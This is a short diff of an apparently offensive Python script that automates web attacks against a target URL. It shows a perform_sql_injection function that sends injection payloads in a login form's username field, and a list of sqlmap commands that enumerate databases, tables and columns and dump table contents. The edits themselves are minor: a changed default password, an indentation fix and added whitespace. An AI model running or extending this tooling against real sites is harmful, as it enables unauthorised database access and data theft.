@@ -82,7 +82,7 @@ def perform_sql_injection(target_url):
     for payload in payloads:
         data = {
             'username': f'admin{payload}',
-            'password': 'admin'  # Update with the correct password field if needed
+            'password': 'password'  # Update with the correct password field if needed
         }
 
         try:
@@ -132,7 +132,7 @@ def main():
         if stdout:
             save_to_file(output_file, stdout)
         if stderr:
-    save_to_file(output_file, f"Errori:\n{stderr}")
+            save_to_file(output_file, f"Errori:\n{stderr}")
         
         # Calculate and print the progress
         progress = (i / total_tools) * 100
@@ -141,7 +141,7 @@ def main():
     # Execute additional SQLMap commands to retrieve database information
     additional_sqlmap_commands = [
         f"sqlmap -u {link_with_https} --dbs",
-        f"sqlmap -u {link_with_https} --tables -D your_database_name",
+        f"sqlmap -u {link_with_https} --tables         -D your_database_name",
         f"sqlmap -u {link_with_https} --columns -D your_database_name -T your_table_name",
         f"sqlmap -u {link_with_https} --dump -D your_database_name -T your_table_name"
     ]
